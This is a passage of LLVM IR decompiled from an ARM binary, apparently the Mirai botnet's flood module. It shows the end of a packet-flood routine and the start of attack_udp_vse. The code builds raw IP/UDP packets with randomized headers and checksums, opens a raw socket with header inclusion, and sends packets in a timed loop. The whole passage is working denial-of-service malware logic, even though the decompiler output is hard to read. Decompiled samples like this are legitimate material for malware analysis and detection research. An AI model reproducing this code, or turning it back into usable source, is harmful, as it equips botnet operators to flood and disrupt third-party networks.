  br i1 %v9_cfd8, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138, %dec_label_pc_d14c
  %v2_cff0 = load i32, i32* @r5, align 4
  %v3_cff0 = add i32 %v2_cff0, 10
  %v4_cff0 = inttoptr i32 %v3_cff0 to i16*
  store i16 0, i16* %v4_cff0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cff8 = load i32, i32* @r5, align 4
  store i32 %v0_cff8, i32* @r0, align 4
  %v2_cffc = call i32 @checksum_generic(i32 %v0_cff8, i32 20)
  %v3_cffc = trunc i32 %v2_cffc to i16
  store i32 %v2_cffc, i32* %r0.global-to-local, align 4
  %v3_d000 = load i32, i32* @r5, align 4
  %v4_d000 = add i32 %v3_d000, 10
  %v5_d000 = inttoptr i32 %v4_d000 to i16*
  store i16 %v3_cffc, i16* %v5_d000, align 2
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d008 = load i32, i32* @r6, align 4
  %v3_d008 = add i32 %v2_d008, 6
  %v4_d008 = inttoptr i32 %v3_d008 to i16*
  store i16 0, i16* %v4_d008, align 2
  %v0_d00c = load i32, i32* @r6, align 4
  %v1_d00c = add i32 %v0_d00c, 4
  %v2_d00c = inttoptr i32 %v1_d00c to i16*
  %v3_d00c = load i16, i16* %v2_d00c, align 2
  %v4_d00c = zext i16 %v3_d00c to i32
  store i32 %v4_d00c, i32* %r2.global-to-local, align 4
  store i32 %v0_d00c, i32* @r1, align 4
  %v0_d014 = load i32, i32* @sl, align 4
  store i32 %v0_d014, i32* %r3.global-to-local, align 4
  %v0_d018 = load i32, i32* @r5, align 4
  store i32 %v0_d018, i32* %r0.global-to-local, align 4
  %v4_d01c = call i32 @checksum_tcpudp(i32 %v0_d018, i32 %v0_d00c, i32 %v4_d00c, i32 %v0_d014)
  %v5_d01c = trunc i32 %v4_d01c to i16
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v3_d020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d020, i32* %r3.global-to-local, align 4
  %v3_d024 = mul i32 %v3_d020, 32
  store i32 %v3_d024, i32* %lr.global-to-local, align 4
  %v3_d028 = load i32, i32* @r6, align 4
  %v4_d028 = add i32 %v3_d028, 6
  %v5_d028 = inttoptr i32 %v4_d028 to i16*
  store i16 %v5_d01c, i16* %v5_d028, align 2
  %v0_d02c = load i32, i32* %lr.global-to-local, align 4
  %v1_d02c = load i32, i32* %r3.global-to-local, align 4
  %tmp53 = mul i32 %v1_d02c, -8
  %v5_d02c = add i32 %v0_d02c, %tmp53
  store i32 %v5_d02c, i32* %lr.global-to-local, align 4
  %v0_d030 = load i32, i32* @r6, align 4
  %v1_d030 = add i32 %v0_d030, 2
  %v2_d030 = inttoptr i32 %v1_d030 to i16*
  %v3_d030 = load i16, i16* %v2_d030, align 2
  %v4_d030 = zext i16 %v3_d030 to i32
  store i32 %v4_d030, i32* @r6, align 4
  %v1_d034 = load i32, i32* @r7, align 4
  %v2_d034 = add i32 %v1_d034, %v5_d02c
  store i32 %v2_d034, i32* @lr, align 4
  %v3_d038 = add i32 %v2_d034, 2
  %v4_d038 = inttoptr i32 %v3_d038 to i16*
  store i16 %v3_d030, i16* %v4_d038, align 2
  %v0_d03c = load i32, i32* @r8, align 4
  store i32 %v0_d03c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d048 = load i32, i32* @r5, align 4
  store i32 %v0_d048, i32* %r1.global-to-local, align 4
  %v0_d04c = load i32, i32* @fp, align 4
  store i32 %v0_d04c, i32* %r0.global-to-local, align 4
  %v0_d050 = load i32, i32* @lr, align 4
  %v6_d058 = call i32 @__libc_sendto(i32 %v0_d04c, i32 %v0_d048, i32 %v0_d03c, i32 16384, i32 %v0_d050, i32 16)
  %v3_d05c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v1_d064 = add i32 %v3_d05c, 1
  store i32 %v1_d064, i32* %r0.global-to-local, align 4
  store i32 %v1_d064, i32* %stack_var_-44, align 4
  %v6_d070 = icmp slt i32 %v1_d064, %arg2
  br i1 %v6_d070, label %dec_label_pc_d074, label %dec_label_pc_d218

dec_label_pc_d074:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf98
  %v1_d088 = phi i32 [ %v1_d064, %dec_label_pc_cfec ], [ 0, %dec_label_pc_cf98 ]
  %v5_d078 = mul i32 %v1_d088, 24
  %v1_d080 = load i32, i32* @r7, align 4
  %v2_d080 = add i32 %v1_d080, %v5_d078
  store i32 %v2_d080, i32* %r3.global-to-local, align 4
  %v1_d084 = add i32 %v2_d080, 20
  %v2_d084 = inttoptr i32 %v1_d084 to i8*
  %v3_d084 = load i8, i8* %v2_d084, align 1
  %v4_d084 = zext i8 %v3_d084 to i32
  store i32 %v4_d084, i32* %r2.global-to-local, align 4
  %v4_d088 = mul i32 %v1_d088, 4
  %v5_d088 = add i32 %v4_d088, %v2_cca8
  %v6_d088 = inttoptr i32 %v5_d088 to i32*
  %v7_d088 = load i32, i32* %v6_d088, align 4
  store i32 %v7_d088, i32* @r5, align 4
  %v1_d090 = add i32 %v7_d088, 20
  store i32 %v1_d090, i32* @r6, align 4
  %tmp54 = icmp ugt i8 %v3_d084, 31
  br i1 %tmp54, label %dec_label_pc_cfac, label %dec_label_pc_d098

dec_label_pc_d098:                                ; preds = %dec_label_pc_d074
  %v1_d098 = add i32 %v2_d080, 16
  %v2_d098 = inttoptr i32 %v1_d098 to i32*
  %v3_d098 = load i32, i32* %v2_d098, align 4
  %v0_d09c = call i32 @rand_next()
  store i32 %v0_d09c, i32* %r0.global-to-local, align 4
  %v3_d0a0 = load i32, i32* %stack_var_-44, align 4
  %v5_d0a8 = mul i32 %v3_d0a0, 24
  %v1_d0ac = and i32 %v3_d098, 16711680
  store i32 %v1_d0ac, i32* %ip.global-to-local, align 4
  %v3_d0b0 = udiv i32 %v3_d098, 16777216
  %v4_d0b4 = udiv i32 %v1_d0ac, 256
  %v5_d0b4 = or i32 %v4_d0b4, %v3_d0b0
  store i32 %v5_d0b4, i32* %r2.global-to-local, align 4
  %v1_d0b8 = load i32, i32* @r7, align 4
  %v2_d0b8 = add i32 %v1_d0b8, %v5_d0a8
  store i32 %v2_d0b8, i32* %r1.global-to-local, align 4
  %v1_d0bc = and i32 %v3_d098, 65280
  store i32 %v1_d0bc, i32* %r3.global-to-local, align 4
  %v1_d0c0 = add i32 %v2_d0b8, 20
  %v2_d0c0 = inttoptr i32 %v1_d0c0 to i8*
  %v3_d0c0 = load i8, i8* %v2_d0c0, align 1
  %v4_d0c0 = zext i8 %v3_d0c0 to i32
  store i32 %v4_d0c0, i32* %ip.global-to-local, align 4
  %v5_d0c8 = call i32 @llvm.bswap.i32(i32 %v3_d098)
  %v7_d0cc = lshr i32 %v0_d09c, %v4_d0c0
  %v8_d0cc = add i32 %v7_d0cc, %v5_d0c8
  store i32 %v8_d0cc, i32* %r2.global-to-local, align 4
  %v1_d0d0 = and i32 %v8_d0cc, 16711680
  store i32 %v1_d0d0, i32* %r0.global-to-local, align 4
  %v1_d0dc = and i32 %v8_d0cc, 65280
  store i32 %v1_d0dc, i32* %r1.global-to-local, align 4
  %v5_d0e4 = call i32 @llvm.bswap.i32(i32 %v8_d0cc)
  store i32 %v5_d0e4, i32* %r3.global-to-local, align 4
  %v0_d0e8 = load i32, i32* @sb, align 4
  %v3_d0e8 = icmp eq i32 %v0_d0e8, -1
  %v1_d0ec = load i32, i32* @r5, align 4
  %v2_d0ec = add i32 %v1_d0ec, 16
  %v3_d0ec = inttoptr i32 %v2_d0ec to i32*
  store i32 %v5_d0e4, i32* %v3_d0ec, align 4
  br i1 %v3_d0e8, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_d0f4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  %v0_d0f4 = call i32 @rand_next()
  store i32 %v0_d0f4, i32* %r0.global-to-local, align 4
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v1_d108 = load i32, i32* @r5, align 4
  %v2_d108 = add i32 %v1_d108, 12
  %v3_d108 = inttoptr i32 %v2_d108 to i32*
  store i32 %v0_d0f4, i32* %v3_d108, align 4
  br i1 %v3_d104, label %dec_label_pc_d110, label %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge

dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge:    ; preds = %dec_label_pc_d0f4
  %v1_cfcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cfc8

dec_label_pc_d110:                                ; preds = %dec_label_pc_d0f4, %dec_label_pc_cfb4
  %v0_d110 = call i32 @rand_next()
  %v1_d110 = trunc i32 %v0_d110 to i16
  %v3_d114 = load i32, i32* @r5, align 4
  %v4_d114 = add i32 %v3_d114, 4
  %v5_d114 = inttoptr i32 %v4_d114 to i16*
  store i16 %v1_d110, i16* %v5_d114, align 2
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v1_d11c = load i32, i32* @r4, align 4
  %v9_d11c = icmp eq i32 %v3_ce48, %v1_d11c
  br i1 %v9_d11c, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_d124:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v0_d124 = call i32 @rand_next()
  %v1_d124 = trunc i32 %v0_d124 to i16
  store i32 %v0_d124, i32* %r0.global-to-local, align 4
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v1_d12c = load i32, i32* @r4, align 4
  %v9_d12c = icmp eq i32 %v3_ce4c, %v1_d12c
  %v3_d130 = load i32, i32* @r5, align 4
  %v4_d130 = add i32 %v3_d130, 20
  %v5_d130 = inttoptr i32 %v4_d130 to i16*
  store i16 %v1_d124, i16* %v5_d130, align 2
  br i1 %v9_d12c, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_d138:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  %v0_d138 = call i32 @rand_next()
  %v1_d138 = trunc i32 %v0_d138 to i16
  store i32 %v0_d138, i32* %r0.global-to-local, align 4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  %v3_d144 = load i32, i32* @r6, align 4
  %v4_d144 = add i32 %v3_d144, 2
  %v5_d144 = inttoptr i32 %v4_d144 to i16*
  store i16 %v1_d138, i16* %v5_d144, align 2
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138
  %v0_d14c = load i32, i32* @r5, align 4
  %v1_d14c = add i32 %v0_d14c, 28
  store i32 %v1_d14c, i32* @r4, align 4
  store i32 %v1_d14c, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %r1.global-to-local, align 4
  %v2_d158 = call i32 @rand_alphastr(i32 %v1_d14c, i32 %v0_ce28)
  store i32 %v2_d158, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d164 = load i32, i32* @r4, align 4
  %v4_d164 = add i32 %v3_d164, %v0_ce28
  %v5_d164 = inttoptr i32 %v4_d164 to i8*
  store i8 0, i8* %v5_d164, align 1
  br label %dec_label_pc_cfec

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d16c.preheader, %dec_label_pc_d16c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d178 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_d178, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %ip.global-to-local, align 4
  %v3_d180 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d180, i32* %r1.global-to-local, align 4
  %v2_d184 = load i32, i32* @r4, align 4
  %v5_d184 = mul i32 %v2_d184, 4
  %v6_d184 = add i32 %v5_d184, %v2_cca8
  %v7_d184 = inttoptr i32 %v6_d184 to i32*
  store i32 %v2_d178, i32* %v7_d184, align 4
  %v0_d188 = load i32, i32* %ip.global-to-local, align 4
  %v1_d188 = load i32, i32* %r1.global-to-local, align 4
  %v4_d188 = mul i32 %v1_d188, 4
  %v5_d188 = add i32 %v4_d188, %v0_d188
  %v6_d188 = inttoptr i32 %v5_d188 to i32*
  %v7_d188 = load i32, i32* %v6_d188, align 4
  store i32 %v7_d188, i32* %r3.global-to-local, align 4
  %v1_d18c = inttoptr i32 %v7_d188 to i8*
  %v2_d18c = load i8, i8* %v1_d18c, align 1
  %tmp55 = urem i8 %v2_d18c, 16
  %v1_d190 = zext i8 %tmp55 to i32
  %v1_d194 = or i32 %v1_d190, 64
  store i32 %v1_d194, i32* %r2.global-to-local, align 4
  %v1_d198 = trunc i32 %v1_d194 to i8
  store i8 %v1_d198, i8* %v1_d18c, align 1
  %v0_d19c = load i32, i32* %r3.global-to-local, align 4
  %v1_d19c = inttoptr i32 %v0_d19c to i8*
  %v2_d19c = load i8, i8* %v1_d19c, align 1
  %v1_d1a0 = and i8 %v2_d19c, -16
  %v1_d1a4 = or i8 %v1_d1a0, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_d1a4, i8* %v1_d19c, align 1
  %v0_d1b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_d1b0 = trunc i32 %v0_d1b0 to i8
  %v2_d1b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b0 = add i32 %v2_d1b0, 9
  %v4_d1b0 = inttoptr i32 %v3_d1b0 to i8*
  store i8 %v1_d1b0, i8* %v4_d1b0, align 1
  %v2_d1b8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b8 = add i32 %v2_d1b8, 1
  %v4_d1b8 = inttoptr i32 %v3_d1b8 to i8*
  store i8 %v5_cce0, i8* %v4_d1b8, align 1
  store i32 %v4_d1bc, i32* %ip.global-to-local, align 4
  %v0_d1c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_d1c0 = mul i32 %v0_d1c0, 32
  store i32 %v3_d1c0, i32* %r0.global-to-local, align 4
  %v2_d1c4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1c4 = add i32 %v2_d1c4, 8
  %v4_d1c4 = inttoptr i32 %v3_d1c4 to i8*
  store i8 %v5_cd18, i8* %v4_d1c4, align 1
  %v0_d1c8 = load i32, i32* @sb, align 4
  %v1_d1c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_d1c8 = add i32 %v1_d1c8, 12
  %v3_d1c8 = inttoptr i32 %v2_d1c8 to i32*
  store i32 %v0_d1c8, i32* %v3_d1c8, align 4
  %v0_d1cc = load i32, i32* %r0.global-to-local, align 4
  %v1_d1cc = load i32, i32* %r1.global-to-local, align 4
  %tmp56 = mul i32 %v1_d1cc, -8
  %v5_d1cc = add i32 %v0_d1cc, %tmp56
  %v1_d1d0 = load i32, i32* @r7, align 4
  %v2_d1d0 = add i32 %v5_d1cc, %v1_d1d0
  store i32 %v2_d1d0, i32* %r2.global-to-local, align 4
  %v1_d1d4 = add i32 %v2_d1d0, 16
  %v2_d1d4 = inttoptr i32 %v1_d1d4 to i32*
  %v3_d1d4 = load i32, i32* %v2_d1d4, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_d1dc = load i32, i32* %r3.global-to-local, align 4
  %v2_d1dc = add i32 %v1_d1dc, 16
  %v3_d1dc = inttoptr i32 %v2_d1dc to i32*
  store i32 %v3_d1d4, i32* %v3_d1dc, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v0_d1e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d1e4 = add i32 %v0_d1e4, 1
  store i32 %v1_d1e4, i32* @r4, align 4
  %v0_d1e8 = load i32, i32* @r6, align 4
  %v1_d1e8 = trunc i32 %v0_d1e8 to i16
  %v2_d1e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1e8 = add i32 %v2_d1e8, 2
  %v4_d1e8 = inttoptr i32 %v3_d1e8 to i16*
  store i16 %v1_d1e8, i16* %v4_d1e8, align 2
  %v0_d1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_d1ec = add i32 %v0_d1ec, 20
  store i32 %v1_d1ec, i32* %r1.global-to-local, align 4
  %v0_d1f0 = load i32, i32* @r8, align 4
  %v1_d1f0 = trunc i32 %v0_d1f0 to i16
  %v3_d1f0 = add i32 %v0_d1ec, 4
  %v4_d1f0 = inttoptr i32 %v3_d1f0 to i16*
  store i16 %v1_d1f0, i16* %v4_d1f0, align 2
  %v0_d1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d1f4 = trunc i32 %v0_d1f4 to i16
  %v2_d1f4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f4 = add i32 %v2_d1f4, 6
  %v4_d1f4 = inttoptr i32 %v3_d1f4 to i16*
  store i16 %v1_d1f4, i16* %v4_d1f4, align 2
  %v0_d1f8 = load i32, i32* @sl, align 4
  %v1_d1f8 = trunc i32 %v0_d1f8 to i16
  %v2_d1f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f8 = add i32 %v2_d1f8, 20
  %v4_d1f8 = inttoptr i32 %v3_d1f8 to i16*
  store i16 %v1_d1f8, i16* %v4_d1f8, align 2
  store i32 %v4_d1fc, i32* %r3.global-to-local, align 4
  %v0_d200 = load i32, i32* @r4, align 4
  %v1_d200 = load i32, i32* %r0.global-to-local, align 4
  %v0_d204 = load i32, i32* @r5, align 4
  %v1_d204 = trunc i32 %v0_d204 to i16
  %v2_d204 = load i32, i32* %r1.global-to-local, align 4
  %v3_d204 = add i32 %v2_d204, 4
  %v4_d204 = inttoptr i32 %v3_d204 to i16*
  store i16 %v1_d204, i16* %v4_d204, align 2
  %v0_d208 = load i32, i32* %r3.global-to-local, align 4
  %v1_d208 = trunc i32 %v0_d208 to i16
  %v2_d208 = load i32, i32* %r1.global-to-local, align 4
  %v3_d208 = add i32 %v2_d208, 2
  %v4_d208 = inttoptr i32 %v3_d208 to i16*
  store i16 %v1_d208, i16* %v4_d208, align 2
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* %stack_var_-44, align 4
  %v5_d210 = icmp slt i32 %v0_d200, %v1_d200
  br i1 %v5_d210, label %dec_label_pc_d16c, label %dec_label_pc_cf84.preheader

dec_label_pc_d218:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf84
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d21c = call i32 @__GI_time(i32* null)
  store i32 %v2_d21c, i32* %r0.global-to-local, align 4
  store i32 %v2_cdc0, i32* %r3.global-to-local, align 4
  %v6_d228 = icmp slt i32 %v2_cdc0, %v2_d21c
  br i1 %v6_d228, label %dec_label_pc_d22c, label %dec_label_pc_cf84

dec_label_pc_d22c:                                ; preds = %dec_label_pc_d218, %entry, %dec_label_pc_d238
  %v1_d234 = phi i32 [ %v3_cdd4, %entry ], [ %v1_d23c, %dec_label_pc_d238 ], [ %v2_d21c, %dec_label_pc_d218 ]
  store i32 %v27_cc7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_d234

dec_label_pc_d238:                                ; preds = %dec_label_pc_cde4
  %v0_d238 = load i32, i32* @fp, align 4
  store i32 %v0_d238, i32* %r0.global-to-local, align 4
  %v1_d23c = call i32 @__GI___libc_close(i32 %v0_d238)
  store i32 %v1_d23c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d22c

; uselistorder directives
  uselistorder i32 %v1_d23c, { 1, 0 }
  uselistorder i32 %v0_d138, { 1, 0 }
  uselistorder i32 %v0_d124, { 1, 0 }
  uselistorder i32 %v1_d11c, { 1, 0 }
  uselistorder i32 %v5_d0e4, { 1, 0 }
  uselistorder i32 %v3_d098, { 2, 1, 3, 0 }
  uselistorder i32 %v1_d064, { 1, 2, 0, 3 }
  uselistorder i32 %v5_d02c, { 1, 0 }
  uselistorder i32 %v4_d01c, { 1, 0 }
  uselistorder i32 %v0_d00c, { 1, 0, 2 }
  uselistorder i32 %v2_cffc, { 1, 0 }
  uselistorder i1 %v2_d140, { 1, 0 }
  uselistorder i32 %v1_cf44, { 1, 0 }
  uselistorder i16 %v5_ced4, { 1, 0 }
  uselistorder i32 %v3_cec0, { 1, 0 }
  uselistorder i32 %v3_cebc, { 1, 0 }
  uselistorder i32 %v3_ceb8, { 1, 0 }
  uselistorder i32 %v1_ce78, { 2, 3, 1, 0 }
  uselistorder i32 %v1_ce74, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v3_ce48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_ce3c, { 1, 0 }
  uselistorder i32 %v0_ce28, { 0, 4, 5, 6, 3, 7, 8, 1, 2 }
  uselistorder i32 %v3_cdd4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_cdc0, { 1, 0 }
  uselistorder i32 %v1_cd9c, { 2, 1, 3, 0 }
  uselistorder i32 %v6_cd5c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_cd28, { 1, 0 }
  uselistorder i8 %v5_cd18, { 1, 0, 2 }
  uselistorder i32 %v6_ccfc, { 1, 0 }
  uselistorder i32 %v7_cce4, { 1, 0, 2 }
  uselistorder i32 %v6_ccc0, { 1, 0 }
  uselistorder i32 %v2_cca8, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 23, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 8, 3, 4, 5, 6, 7, 10, 9, 12, 11, 14, 15, 13, 17, 16, 19, 18, 20, 22, 21, 29, 23, 24, 25, 26, 27, 28, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32 %arg2, { 2, 5, 4, 6, 0, 3, 1, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_d22c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d16c, { 1, 0 }
  uselistorder label %dec_label_pc_d14c, { 1, 0 }
  uselistorder label %dec_label_pc_cfec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf84, { 1, 0 }
  uselistorder label %dec_label_pc_cee0, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d248 = load i32, i32* @r4, align 4
  %v27_d248 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d274 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d278 = load i32, i32* @r4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d280 = load i32, i32* @r7, align 4
  store i32 %v0_d280, i32* %r3.global-to-local, align 4
  store i32 %v2_d274, i32* @sb, align 4
  %v0_d288 = load i32, i32* @r5, align 4
  %v4_d28c = inttoptr i32 %v0_d278 to i32*
  %v5_d28c = call i32 @attack_get_opt_int(i32 %v0_d288, i32* %v4_d28c, i32 2, i32 %v0_d280)
  %v1_d298 = urem i32 %v5_d28c, 256
  store i32 %v1_d298, i32* %ip.global-to-local, align 4
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d2a8 = load i32, i32* @r5, align 4
  %v5_d2ac = trunc i32 %v5_d28c to i8
  %v6_d2b0 = inttoptr i32 %v0_d29c to i32*
  %v7_d2b0 = call i32 @attack_get_opt_int(i32 %v0_d2a8, i32* %v6_d2b0, i32 3, i32 65535)
  %v0_d2b4 = load i32, i32* @r4, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d2c4 = load i32, i32* @r5, align 4
  %v5_d2c8 = inttoptr i32 %v0_d2b4 to i32*
  %v6_d2c8 = call i32 @attack_get_opt_int(i32 %v0_d2c4, i32* %v5_d2c8, i32 4, i32 64)
  %v0_d2d0 = load i32, i32* @r4, align 4
  %v1_d2d4 = urem i32 %v6_d2c8, 256
  store i32 %v1_d2d4, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d2dc = load i32, i32* @r7, align 4
  store i32 %v0_d2dc, i32* %r3.global-to-local, align 4
  %v0_d2e0 = load i32, i32* @r5, align 4
  %v6_d2e8 = inttoptr i32 %v0_d2d0 to i32*
  %v7_d2e8 = call i32 @attack_get_opt_int(i32 %v0_d2e0, i32* %v6_d2e8, i32 5, i32 %v0_d2dc)
  %v1_d2f4 = urem i32 %v7_d2e8, 256
  store i32 %v1_d2f4, i32* %ip.global-to-local, align 4
  %v0_d2f8 = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d304 = load i32, i32* @r5, align 4
  %v5_d30c = inttoptr i32 %v0_d2f8 to i32*
  %v6_d30c = call i32 @attack_get_opt_int(i32 %v0_d304, i32* %v5_d30c, i32 6, i32 65535)
  %v0_d314 = load i32, i32* @r4, align 4
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d324 = load i32, i32* @r5, align 4
  %v5_d328 = inttoptr i32 %v0_d314 to i32*
  %v6_d328 = call i32 @attack_get_opt_int(i32 %v0_d324, i32* %v5_d328, i32 7, i32 27015)
  store i32 %v6_d328, i32* @r4, align 4
  %v0_d330 = load i32, i32* @r7, align 4
  store i32 %v0_d330, i32* %stack_var_-48, align 4
  %v1_d338 = inttoptr i32 %v0_d330 to i32*
  %v2_d338 = call i32 @__GI_time(i32* %v1_d338)
  %v1_d33c = load i32, i32* @r6, align 4
  %v2_d33c = add i32 %v1_d33c, %v2_d338
  %v1_d348 = call i32 @table_unlock_val(i32 36)
  %v3_d354 = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d368 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_d36c = icmp eq i32 %v3_d368, -1
  store i32 %v3_d368, i32* @sl, align 4
  br i1 %v7_d36c, label %dec_label_pc_d698, label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d380 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d380, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_d388 = load i32, i32* @r7, align 4
  store i32 %v0_d388, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d394 = call i32 @__GI_setsockopt(i32 %v3_d368, i32 %v0_d388, i32 3, i32 %v6_d380, i32 ptrtoint (i32* @0 to i32))
  %v7_d398 = icmp eq i32 %v5_d394, -1
  br i1 %v7_d398, label %dec_label_pc_d6a4, label %dec_label_pc_d3a0

dec_label_pc_d3a0:                                ; preds = %dec_label_pc_d378
  store i32 %v6_d30c, i32* %r2.global-to-local, align 4
  %v0_d3ac = load i32, i32* @r4, align 4
  %v3_d3b0 = mul i32 %v6_d30c, 65536
  store i32 %v3_d3b0, i32* %ip.global-to-local, align 4
  %v3_d3b4 = urem i32 %v7_d2b0, 65536
  store i32 %v3_d3b4, i32* %r3.global-to-local, align 4
  %v3_d3b8 = urem i32 %v6_d30c, 65536
  %v3_d3bc = urem i32 %v0_d3ac, 65536
  %v0_d3c0 = load i32, i32* @fp, align 4
  %v2_d3c0 = icmp eq i32 %v0_d3c0, 0
  %v0_d3c4 = load i32, i32* @r7, align 4
  store i32 %v0_d3c4, i32* %stack_var_-44, align 4
  br i1 %v2_d3c0, label %dec_label_pc_d504.preheader, label %dec_label_pc_d3d8

